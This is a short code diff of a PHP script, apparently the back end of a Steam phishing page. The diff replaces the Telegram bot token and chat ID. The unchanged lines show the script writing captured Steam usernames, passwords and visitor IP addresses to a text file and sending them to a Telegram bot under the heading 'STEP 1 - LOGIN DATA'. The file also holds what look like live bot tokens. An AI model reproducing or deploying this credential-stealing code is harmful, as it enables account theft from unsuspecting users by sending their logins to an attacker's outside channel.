@@ -7,8 +7,8 @@ $ip = $_SERVER['REMOTE_ADDR'];
 file_put_contents("usernames.txt", "Steam Username: $username | Pass: $password | IP: $ip\n", FILE_APPEND);
 
 // 2. Отправляем в Telegram
-$botToken = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
-$chatId = "7455610355";
+$botToken = "8415644431:AAEjoQoN5J-dgV4SwMQ1-WOxJxFiaSPpYAs";
+$chatId = "8145443779";
 $message = "🔥 STEP 1 - LOGIN DATA\n👤: $username\n🔑: $password\n🌐 IP: $ip";
 
 $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
